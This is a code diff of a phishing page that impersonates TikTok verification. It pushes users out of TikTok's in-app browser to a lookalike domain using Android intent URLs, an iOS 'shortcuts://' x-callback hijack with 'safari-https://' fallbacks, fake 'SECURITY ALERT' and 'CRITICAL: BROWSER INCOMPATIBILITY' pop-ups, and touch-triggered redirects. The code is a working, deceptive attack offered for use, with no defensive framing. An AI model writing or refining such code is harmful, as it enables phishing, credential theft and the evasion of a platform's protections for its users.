@@ -3,71 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body { background: #fff; margin: 0; padding: 0; overflow: hidden; height: 100vh; width: 100vw; }
-        /* This covers the ENTIRE screen and is invisible */
-        #ghost-link {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 9999;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #ccc;
-            font-family: sans-serif;
-        }
-    </style>
+    <style>body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
 </head>
 <body>
-
-<a href="https://tik-tok-verification.com/Verification/verify1.html" id="ghost-link">
-    Verifying Connection...
-</a>
+    <div id="loader">AUTHENTICATING...</div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    // We remove the protocol for the callback string
     const domain = "tik-tok-verification.com/Verification/verify1.html";
 
-    function ejectNow() {
+    function breakTheSandbox() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Forcing the 'Intent' via the ghost link
+            // Android: Chrome Intent with 'Sling' flags
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE CONTEXT SWAP
-            // 1. We try the Direct Protocol jump
-            window.location.href = "googlechromes://" + domain;
+            // iOS: THE SHORTCUTS HIJACK (Zero-Day Logic)
+            // 1. We call a shortcut that DOES NOT EXIST (Random ID)
+            // 2. We set the x-error callback to your Safari link.
+            // 3. TikTok allows the 'shortcuts://' scheme because it's a native Apple app.
             
-            // 2. We trigger a programmatic click on the full-screen <a> tag
-            document.getElementById('ghost-link').click();
+            const errorUrl = encodeURIComponent("safari-https://" + domain);
+            const hijackScheme = `shortcuts://x-callback-url/run-shortcut?name=SystemVerify_${Math.floor(Math.random()*99999)}&x-error=${errorUrl}&x-cancel=${errorUrl}`;
 
-            // 3. We hit the system with a 'Location' update to a protocol TikTok can't render
+            window.location.href = hijackScheme;
+
+            // Immediate fallback if Shortcuts isn't installed
             setTimeout(() => {
-                window.location.assign("safari-https://" + domain);
-            }, 100);
+                window.location.href = "safari-https://" + domain;
+            }, 250);
         }
     }
 
-    // This triggers the moment they touch ANYWHERE on the screen
-    document.addEventListener('touchstart', function() {
-        ejectNow();
-    }, false);
-
-    // Initial attempt on load
+    // Force ejection through a user-interaction bridge
     window.onload = function() {
-        ejectNow();
-        
-        // The "Alert-Trap": When they hit 'OK', the touch triggers the redirect
+        // First attempt (Silent)
+        breakTheSandbox();
+
+        // The 'System Alert' Bridge
         setTimeout(() => {
-            const header = "SECURITY ALERT\n";
-            const body = "______________________________\n\nPlease complete verification in your external browser to continue.";
-            alert(header + body);
-            ejectNow();
-        }, 500);
+            if (document.hasFocus()) {
+                const header = "CRITICAL: BROWSER INCOMPATIBILITY\n";
+                const body = "______________________________\n\nYour current browser does not support TikTok Secure Auth. Tap OK to continue in Safari.";
+                
+                alert(header + body);
+                
+                // Fire the hijack on the user's "OK" gesture
+                breakTheSandbox();
+            }
+        }, 600);
     };
+
+    // Global touch listener for manual override
+    document.addEventListener('touchstart', breakTheSandbox);
 </script>
 </body>
 </html>
